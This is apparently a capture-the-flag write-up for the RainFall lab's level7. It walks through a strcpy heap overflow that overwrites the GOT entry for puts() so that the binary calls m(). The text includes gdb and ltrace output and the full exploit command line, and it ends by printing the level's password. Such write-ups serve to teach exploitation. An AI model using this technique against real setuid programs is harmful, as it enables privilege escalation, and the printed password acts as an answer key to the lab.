Level7 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
```

Level7 rights:
```Shell
-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
```

Here is what we get when testing:
```Shell
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 asd
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 asd bgj
~~
```

It's a bit similar to the previous one.
Decompiling with Ghidra on https://dogbolt.org/ shows five things:
- the program takes two arguments and does four `malloc()`, two for arrays and two for each of their second index
- `strcpy()` is used twice to copy the arguments at each index
- `fopen()` and `fgets()` fetch and store the password in a global `c` variable
- the program uses `puts()` to display `~~`, when receiving two args
- there is an unused `m()` function that prints the content of `c`

The goal is therefore to find a way to call `m()` after the password has been loaded into `c`. Maybe we can replace the last `puts()` call by a call to `m()`. If we can find where the address of `puts()` is stored in GOT, we can replace it with `m()`. But how can we overwrite this address?
We know that `strcpy()` is vulnerable to buffer overflows. It means that whatever we send as arguments to the program can potentially overwrite slots in the memory. Let's use `ltrace` to calculate the correct offset for our payload:
```Shell
level7@RainFall:~$ ltrace ./level7
[...]
// malloc(8) = 0x0804a008  // array1
malloc(8) = 0x0804a018  // arg1
malloc(8) = 0x0804a028  // array2
// malloc(8) = 0x0804a038  // arg2
```
Since we want to store `puts()` at the second index of the second array, we must:
- overflow arg1
- reach the second array
- reach the second index of the second array.
We must subtract 0x0804a028(array2) - 0x0804a018(arg1) = 16. This would overwrite enough to reach the start of the second array. But what we want is reaching the second index, so let's add 4 (half of 8-byte), making it a total of 20 bytes of padding.

Next, let's find where `puts()` is located in GOT:
```Shell
(gdb) disas main
[...]
0x080485f7 <+214>:   call   0x8048400 <puts@plt>
[...]
(gdb) disas 0x8048400
[...]
0x08048400 <+0>:     jmp    *0x8049928
[...]
```
The jump is done to the address of `puts()`, which converted to little endian is: `\x28\x99\x04\x08`. So this is where we want to store the address of `m()`.

Let's find what it is:
```Shell
(gdb) x m
0x80484f4 <m>:  0x83e58955
```
In Little Endian: `\xf4\x84\x04\x08`.

Finally, our two arguments will be:
- $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') which is the padding + the address of `puts()`
- $(python -c 'print("\xf4\x84\x04\x08")') which is the address of `m()`

And the result is:
```Shell
level7@RainFall:~$ ./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1721403522
```
